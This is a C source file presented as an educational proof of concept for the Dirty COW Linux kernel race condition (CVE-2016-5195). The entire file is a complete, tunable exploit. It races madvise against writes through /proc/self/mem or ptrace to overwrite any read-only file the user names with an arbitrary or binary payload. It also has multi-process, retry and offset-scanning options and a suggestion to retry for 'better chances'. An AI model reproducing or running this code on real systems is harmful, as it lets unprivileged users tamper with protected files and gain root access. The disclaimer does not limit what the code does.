
/*
 * Educational Proof of Concept - Dirty COW Vulnerability (CVE-2016-5195)
 * 
 * This code is for educational purposes and vulnerability research only.
 * Any malicious use is strictly prohibited and illegal.
 * 
 * CVE-2016-5195 - Linux Kernel Copy-On-Write Race Condition
 * Target: Linux Kernel < 4.8.3, < 4.7.9, < 4.4.26
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <stdint.h>
#include <errno.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <signal.h>
#include <stdarg.h>
#include <getopt.h>
#include <openssl/evp.h>
#include <openssl/sha.h>

// Global exploit variables
void *map;
int f;
char *target_file;
int exploit_success = 0;
int verbose = 0;
FILE *log_file = NULL;

// Configuration structure for different attack modes
typedef struct {
    char *target_path;
    char *payload;
    size_t payload_len;
    int iterations;
    int mode;
    int use_ptrace;
    int num_processes;
    int repeat_count;
    char *payload_file;
    int dynamic_offset;
} exploit_config_t;

// Attack modes
#define MODE_TEST_LAB       1
#define MODE_CUSTOM_FILE    2
#define MODE_BINARY_PAYLOAD 3

// Test payload
char *test_payload = "EDUCATIONAL-POC-DIRTY-COW-TEST\n";

// Statistics
typedef struct {
    int total_writes;
    int successful_writes;
    int madvise_calls;
    double avg_write_time;
    double total_duration;
    int best_offset;
} exploit_stats_t;

exploit_stats_t stats = {0};

void log_message(const char *format, ...) {
    va_list args;
    time_t now;
    char timestamp[64];
    
    time(&now);
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
    
    // Log to file
    if (log_file) {
        fprintf(log_file, "[%s] ", timestamp);
        va_start(args, format);
        vfprintf(log_file, format, args);
        va_end(args);
        fflush(log_file);
    }
    
    // Log to console if verbose
    if (verbose) {
        printf("[%s] ", timestamp);
        va_start(args, format);
        vprintf(format, args);
        va_end(args);
    }
}

char* calculate_sha256(const char *filepath) {
    FILE *file = fopen(filepath, "rb");
    if (!file) return NULL;
    
    EVP_MD_CTX *ctx = EVP_MD_CTX_new();
    if (!ctx) {
        fclose(file);
        return NULL;
    }
    
    if (EVP_DigestInit_ex(ctx, EVP_sha256(), NULL) != 1) {
        EVP_MD_CTX_free(ctx);
        fclose(file);
        return NULL;
    }
    
    unsigned char buffer[8192];
    size_t bytes;
    while ((bytes = fread(buffer, 1, sizeof(buffer), file)) > 0) {
        if (EVP_DigestUpdate(ctx, buffer, bytes) != 1) {
            EVP_MD_CTX_free(ctx);
            fclose(file);
            return NULL;
        }
    }
    
    unsigned char hash[EVP_MAX_MD_SIZE];
    unsigned int hash_len;
    if (EVP_DigestFinal_ex(ctx, hash, &hash_len) != 1) {
        EVP_MD_CTX_free(ctx);
        fclose(file);
        return NULL;
    }
    
    EVP_MD_CTX_free(ctx);
    fclose(file);
    
    char *hex_hash = malloc(hash_len * 2 + 1);
    if (!hex_hash) return NULL;
    
    for (unsigned int i = 0; i < hash_len; i++) {
        sprintf(hex_hash + i * 2, "%02x", hash[i]);
    }
    hex_hash[hash_len * 2] = '\0';
    
    return hex_hash;
}

// Thread function for madvise operations
void *madviseThread(void *arg) {
    int i, c = 0;
    int iterations = *((int*)arg);
    struct timespec start, end;
    
    clock_gettime(CLOCK_MONOTONIC, &start);
    log_message("THREAD-1: Starting madvise operations (%d iterations)\n", iterations);
    
    for(i = 0; i < iterations; i++) {
        c += madvise(map, 100, MADV_DONTNEED);
        
        // Add small delay to prevent system freeze on high iterations
        if (iterations > 50000000 && i % 10000 == 0) {
            usleep(1);
        }
    }
    
    clock_gettime(CLOCK_MONOTONIC, &end);
    double duration = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9;
    
    stats.madvise_calls = c;
    log_message("THREAD-1: Completed %d madvise calls in %.3f seconds\n", c, duration);
    
    return NULL;
}

// Ptrace-based memory writing
int ptrace_write_memory(pid_t pid, void *addr, char *data, size_t size) {
    for (size_t i = 0; i < size; i += sizeof(long)) {
        long word = 0;
        memcpy(&word, data + i, sizeof(long));
        
        if (ptrace(PTRACE_POKETEXT, pid, (char*)addr + i, word) == -1) {
            return -1;
        }
    }
    return 0;
}

// Thread function for memory writing with multiple methods
void *procselfmemThread(void *arg) {
    exploit_config_t *config = (exploit_config_t*)arg;
    int memfd = -1;
    int i, c = 0, successful_writes = 0;
    struct timespec start, end, write_start, write_end;
    double total_write_time = 0;
    
    clock_gettime(CLOCK_MONOTONIC, &start);
    
    // Try /proc/self/mem first
    if (!config->use_ptrace) {
        memfd = open("/proc/self/mem", O_RDWR);
        if (memfd == -1) {
            log_message("THREAD-2: /proc/self/mem failed, switching to ptrace\n");
            config->use_ptrace = 1;
        }
    }
    
    log_message("THREAD-2: Starting memory write operations (%s method)\n", 
                config->use_ptrace ? "ptrace" : "/proc/self/mem");
    
    for(i = 0; i < config->iterations; i++) {
        clock_gettime(CLOCK_MONOTONIC, &write_start);
        
        ssize_t written = 0;
        
        if (config->dynamic_offset) {
            // Try different offsets
            for (int offset = 0; offset < 1024; offset += 64) {
                void *target_addr = (char*)map + offset;
                
                if (config->use_ptrace) {
                    if (ptrace_write_memory(getpid(), target_addr, config->payload, config->payload_len) == 0) {
                        written = config->payload_len;
                        if (offset < stats.best_offset || stats.best_offset == 0) {
                            stats.best_offset = offset;
                        }
                        break;
                    }
                } else {
                    lseek(memfd, (uintptr_t)target_addr, SEEK_SET);
                    written = write(memfd, config->payload, config->payload_len);
                    if (written == (ssize_t)config->payload_len) {
                        if (offset < stats.best_offset || stats.best_offset == 0) {
                            stats.best_offset = offset;
                        }
                        break;
                    }
                }
            }
        } else {
            // Standard single offset approach
            if (config->use_ptrace) {
                if (ptrace_write_memory(getpid(), map, config->payload, config->payload_len) == 0) {
                    written = config->payload_len;
                }
            } else {
                lseek(memfd, (uintptr_t)map, SEEK_SET);
                written = write(memfd, config->payload, config->payload_len);
            }
        }
        
        clock_gettime(CLOCK_MONOTONIC, &write_end);
        double write_time = (write_end.tv_sec - write_start.tv_sec) + 
                           (write_end.tv_nsec - write_start.tv_nsec) / 1e9;
        total_write_time += write_time;
        
        // Check for complete write, not just partial
        if (written == (ssize_t)config->payload_len) {
            successful_writes++;
        }
        if (written > 0) {
            c++;
        }
        
        // Add small delay to prevent system freeze on high iterations
        if (config->iterations > 50000000 && i % 10000 == 0) {
            usleep(1);
        }
        
        // Sync memory if needed
        if (written > 0) {
            msync(map, config->payload_len, MS_SYNC);
        }
    }
    
    clock_gettime(CLOCK_MONOTONIC, &end);
    double duration = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9;
    
    stats.total_writes = c;
    stats.successful_writes = successful_writes;
    stats.avg_write_time = total_write_time / config->iterations;
    stats.total_duration = duration;
    
    log_message("THREAD-2: Total write attempts: %d\n", c);
    log_message("THREAD-2: Complete writes: %d\n", successful_writes);
    log_message("THREAD-2: Average write time: %.6f seconds\n", stats.avg_write_time);
    log_message("THREAD-2: Best offset: %d\n", stats.best_offset);
    
    if (memfd != -1) close(memfd);
    return NULL;
}

void print_system_info() {
    int ret;
    printf("=== SYSTEM INFORMATION ===\n");
    printf("Kernel Version: ");
    ret = system("uname -r");
    (void)ret; // Suppress unused variable warning
    printf("Architecture: ");
    ret = system("uname -m");
    (void)ret; // Suppress unused variable warning
    printf("Current User: %s\n", getenv("USER"));
    printf("UID/GID: %d/%d\n", getuid(), getgid());
    
    log_message("System Info - UID/GID: %d/%d\n", getuid(), getgid());
    printf("\n");
}

int check_vulnerability() {
    printf("=== VULNERABILITY CHECK ===\n");
    
    // Check kernel version
    FILE *version_file = fopen("/proc/version", "r");
    if (version_file) {
        char version[256];
        if (fgets(version, sizeof(version), version_file)) {
            printf("Kernel: %s", version);
            log_message("Kernel version: %s", version);
        }
        fclose(version_file);
    }
    
    // Check for /proc/self/mem accessibility
    int mem_fd = open("/proc/self/mem", O_RDWR);
    if (mem_fd == -1) {
        printf("[-] /proc/self/mem not accessible - will use ptrace\n");
        log_message("/proc/self/mem not accessible - switching to ptrace\n");
        return 0;
    } else {
        printf("[+] /proc/self/mem accessible\n");
        log_message("/proc/self/mem accessible\n");
        close(mem_fd);
    }
    
    return 1;
}

int backup_file(char *filepath) {
    FILE *src, *dst;
    char backup_path[512];
    char buffer[1024];
    size_t bytes;
    
    snprintf(backup_path, sizeof(backup_path), "%s.backup", filepath);
    
    src = fopen(filepath, "r");
    if (!src) return -1;
    
    dst = fopen(backup_path, "w");
    if (!dst) {
        fclose(src);
        return -1;
    }
    
    while ((bytes = fread(buffer, 1, sizeof(buffer), src)) > 0) {
        fwrite(buffer, 1, bytes, dst);
    }
    
    fclose(src);
    fclose(dst);
    
    printf("[+] Backup created: %s\n", backup_path);
    log_message("Backup created: %s\n", backup_path);
    return 0;
}

int load_payload_from_file(const char *filename, char **payload, size_t *size) {
    FILE *file = fopen(filename, "rb");
    if (!file) {
        log_message("Failed to open payload file: %s\n", filename);
        return -1;
    }
    
    fseek(file, 0, SEEK_END);
    *size = ftell(file);
    fseek(file, 0, SEEK_SET);
    
    *payload = malloc(*size);
    if (!*payload) {
        fclose(file);
        return -1;
    }
    
    size_t read_bytes = fread(*payload, 1, *size, file);
    fclose(file);
    
    if (read_bytes != *size) {
        free(*payload);
        return -1;
    }
    
    log_message("Loaded payload from file: %s (%zu bytes)\n", filename, *size);
    return 0;
}

int run_exploit_process(exploit_config_t *config) {
    pthread_t thread1, thread2;
    struct stat file_stats;
    
    // Open file as read-only
    f = open(config->target_path, O_RDONLY);
    if (f == -1) {
        log_message("Failed to open target file: %s\n", config->target_path);
        return -1;
    }
    
    fstat(f, &file_stats);
    
    // Map file to memory
    map = mmap(NULL, file_stats.st_size, PROT_READ, MAP_PRIVATE, f, 0);
    if (map == MAP_FAILED) {
        log_message("Memory mapping failed\n");
        close(f);
        return -1;
    }
    
    // Launch racing threads
    pthread_create(&thread1, NULL, madviseThread, &config->iterations);
    pthread_create(&thread2, NULL, procselfmemThread, config);
    
    // Wait for completion
    pthread_join(thread1, NULL);
    pthread_join(thread2, NULL);
    
    // Cleanup
    close(f);
    munmap(map, file_stats.st_size);
    
    return 0;
}

int execute_exploit(exploit_config_t *config) {
    char original_content[1024];
    FILE *fp;
    char *original_hash = NULL;
    char *final_hash = NULL;
    int success = 0;
    
    printf("\n=== EXPLOIT EXECUTION ===\n");
    printf("[+] Target: %s\n", config->target_path);
    printf("[+] Payload length: %zu bytes\n", config->payload_len);
    printf("[+] Iterations: %d\n", config->iterations);
    printf("[+] Processes: %d\n", config->num_processes);
    printf("[+] Method: %s\n", config->use_ptrace ? "ptrace" : "/proc/self/mem");
    printf("[+] Dynamic offset: %s\n", config->dynamic_offset ? "enabled" : "disabled");
    
    log_message("Starting exploit - Target: %s, Payload: %zu bytes, Iterations: %d, Processes: %d\n",
                config->target_path, config->payload_len, config->iterations, config->num_processes);
    
    // Warn about high iteration counts
    if (config->iterations > 50000000) {
        printf("[!] WARNING: High iteration count may cause system slowdown\n");
        log_message("WARNING: High iteration count: %d\n", config->iterations);
    }
    
    // Backup original file if it exists
    if (access(config->target_path, F_OK) != -1) {
        backup_file(config->target_path);
        original_hash = calculate_sha256(config->target_path);
        if (original_hash) {
            log_message("Original file hash: %s\n", original_hash);
        }
    }
    
    // Create target file if it doesn't exist (for testing)
    if (access(config->target_path, F_OK) == -1) {
        printf("[+] Creating target file for testing\n");
        fp = fopen(config->target_path, "w");
        if (fp) {
            fprintf(fp, "original-content-before-exploit\n");
            fclose(fp);
        }
    }
    
    // Read original content
    fp = fopen(config->target_path, "r");
    if (fp) {
        if (fgets(original_content, sizeof(original_content), fp)) {
            printf("[+] Original content: %s", original_content);
        }
        fclose(fp);
    }
    
    printf("[+] Starting race condition test...\n");
    
    // Run exploit with multiple processes for maximum race conditions
    for (int attempt = 0; attempt < config->repeat_count; attempt++) {
        log_message("Attempt %d/%d\n", attempt + 1, config->repeat_count);
        
        for (int i = 0; i < config->num_processes; i++) {
            pid_t pid = fork();
            if (pid == 0) {
                // Child process - run exploit
                run_exploit_process(config);
                exit(0);
            } else if (pid < 0) {
                log_message("Fork failed for process %d\n", i);
            }
        }
        
        // Wait for all child processes
        for (int i = 0; i < config->num_processes; i++) {
            int status;
            wait(&status);
        }
        
        // Check if exploit succeeded after this attempt
        fp = fopen(config->target_path, "rb");
        if (fp) {
            char buffer[4096];
            size_t read_bytes = fread(buffer, 1, sizeof(buffer), fp);
            fclose(fp);
            
            if (memmem(buffer, read_bytes, config->payload, config->payload_len) != NULL) {
                printf("[+] EXPLOIT SUCCESSFUL on attempt %d!\n", attempt + 1);
                log_message("EXPLOIT SUCCESSFUL on attempt %d\n", attempt + 1);
                success = 1;
                break;
            }
        }
        
        if (attempt < config->repeat_count - 1) {
            printf("[-] Attempt %d failed, retrying...\n", attempt + 1);
            sleep(1); // Brief pause between attempts
        }
    }
    
    // Final verification with hash comparison
    final_hash = calculate_sha256(config->target_path);
    if (original_hash && final_hash) {
        if (strcmp(original_hash, final_hash) != 0) {
            printf("[+] File hash changed - modification confirmed!\n");
            printf("[+] Original: %s\n", original_hash);
            printf("[+] Final:    %s\n", final_hash);
            log_message("File hash changed - Original: %s, Final: %s\n", original_hash, final_hash);
            success = 1;
        } else {
            printf("[-] File hash unchanged - exploit failed\n");
            log_message("File hash unchanged - exploit failed\n");
        }
    }
    
    if (original_hash) free(original_hash);
    if (final_hash) free(final_hash);
    
    // Log final statistics
    log_message("Final stats - Writes: %d, Successful: %d, madvise: %d, Duration: %.3f sec\n",
                stats.total_writes, stats.successful_writes, stats.madvise_calls, stats.total_duration);
    
    return success ? 0 : -1;
}

void print_usage(char *progname) {
    printf("Educational Dirty COW PoC Usage:\n");
    printf("%s [options]\n\n", progname);
    printf("Options:\n");
    printf("  -t <file>     Target file (default: /tmp/dirty_cow_test)\n");
    printf("  -p <payload>  Custom payload\n");
    printf("  -f <file>     Load payload from binary file\n");
    printf("  -i <num>      Iterations (default: 10000000, max: 100000000)\n");
    printf("  -n <num>      Number of processes (default: 1, max: 8)\n");
    printf("  -r <num>      Retry attempts (default: 1, max: 10)\n");
    printf("  -P            Use ptrace instead of /proc/self/mem\n");
    printf("  -D            Enable dynamic offset scanning\n");
    printf("  -v            Verbose output\n");
    printf("  -l <file>     Log file (default: exploit_log.txt)\n");
    printf("  -h            Show this help\n\n");
    printf("Examples:\n");
    printf("  %s -t /tmp/testfile -i 5000000 -v\n", progname);
    printf("  %s -f payload.bin -n 4 -r 3 -D -v\n", progname);
    printf("  %s -P -D -n 2 -i 20000000\n", progname);
}

int main(int argc, char *argv[]) {
    exploit_config_t config;
    int opt;
    char *log_filename = "exploit_log.txt";
    
    // Default configuration - safe values
    config.mode = MODE_TEST_LAB;
    config.target_path = "/tmp/dirty_cow_test";
    config.payload = test_payload;
    config.payload_len = strlen(test_payload);
    config.iterations = 10000000;
    config.use_ptrace = 0;
    config.num_processes = 1;
    config.repeat_count = 1;
    config.payload_file = NULL;
    config.dynamic_offset = 0;
    
    // Parse command line arguments
    while ((opt = getopt(argc, argv, "t:p:f:i:n:r:PDvl:h")) != -1) {
        switch (opt) {
            case 't':
                config.target_path = optarg;
                break;
            case 'p':
                config.payload = optarg;
                config.payload_len = strlen(optarg);
                break;
            case 'f':
                config.payload_file = optarg;
                break;
            case 'i':
                config.iterations = atoi(optarg);
                if (config.iterations > 100000000) {
                    printf("[!] WARNING: Iteration count capped at 100M for safety\n");
                    config.iterations = 100000000;
                }
                break;
            case 'n':
                config.num_processes = atoi(optarg);
                if (config.num_processes > 8) {
                    printf("[!] WARNING: Process count capped at 8 for safety\n");
                    config.num_processes = 8;
                }
                break;
            case 'r':
                config.repeat_count = atoi(optarg);
                if (config.repeat_count > 10) {
                    printf("[!] WARNING: Retry count capped at 10 for safety\n");
                    config.repeat_count = 10;
                }
                break;
            case 'P':
                config.use_ptrace = 1;
                break;
            case 'D':
                config.dynamic_offset = 1;
                break;
            case 'v':
                verbose = 1;
                break;
            case 'l':
                log_filename = optarg;
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }
    
    // Open log file
    log_file = fopen(log_filename, "a");
    if (!log_file) {
        printf("Warning: Could not open log file %s\n", log_filename);
    } else {
        log_message("=== NEW SESSION STARTED ===\n");
    }
    
    // Load payload from file if specified
    if (config.payload_file) {
        char *file_payload;
        size_t file_size;
        if (load_payload_from_file(config.payload_file, &file_payload, &file_size) == 0) {
            config.payload = file_payload;
            config.payload_len = file_size;
            config.mode = MODE_BINARY_PAYLOAD;
        } else {
            printf("[-] Failed to load payload file: %s\n", config.payload_file);
            return 1;
        }
    }
    
    printf("Dirty COW Educational PoC (CVE-2016-5195)\n");
    printf("==========================================\n\n");
    
    if (geteuid() == 0) {
        printf("[!] WARNING: Running as root - exploit effects may be limited\n\n");
    }
    
    print_system_info();
    
    if (!check_vulnerability()) {
        printf("[-] /proc/self/mem not available - using ptrace method\n");
        config.use_ptrace = 1;
    }
    
    target_file = config.target_path;
    
    printf("\n=== STARTING TEST ===\n");
    
    exploit_success = (execute_exploit(&config) == 0);
    
    if (exploit_success) {
        printf("\n=== TEST SUCCESSFUL ===\n");
        printf("[+] File modification completed\n");
        printf("[+] Educational objective achieved\n");
        printf("[+] Statistics: %d writes, %d successful, %.3f sec\n", 
               stats.total_writes, stats.successful_writes, stats.total_duration);
        
        if (strstr(config.target_path, "/tmp/") != config.target_path) {
            printf("\n[!] IMPORTANT: System file modified - restore from backup!\n");
            printf("[!] Restore command: cp %s.backup %s\n", config.target_path, config.target_path);
        }
    } else {
        printf("\n=== TEST FAILED ===\n");
        printf("[-] Target may be patched or conditions not met\n");
        printf("[-] Try different parameters or check system compatibility\n");
        printf("[-] Consider using: -P -D -n 4 -r 3 for better chances\n");
    }
    
    log_message("Session completed - Result: %s\n", exploit_success ? "SUCCESS" : "FAILED");
    
    if (log_file) {
        log_message("=== SESSION ENDED ===\n\n");
        fclose(log_file);
    }
    
    printf("\n=== EDUCATIONAL SESSION COMPLETE ===\n");
    printf("Remember: This tool is for educational purposes only!\n");
    printf("Log saved to: %s\n", log_filename);
    
    // Clean up allocated payload if loaded from file
    if (config.mode == MODE_BINARY_PAYLOAD && config.payload_file) {
        free(config.payload);
    }
    
    return exploit_success ? 0 : 1;
}
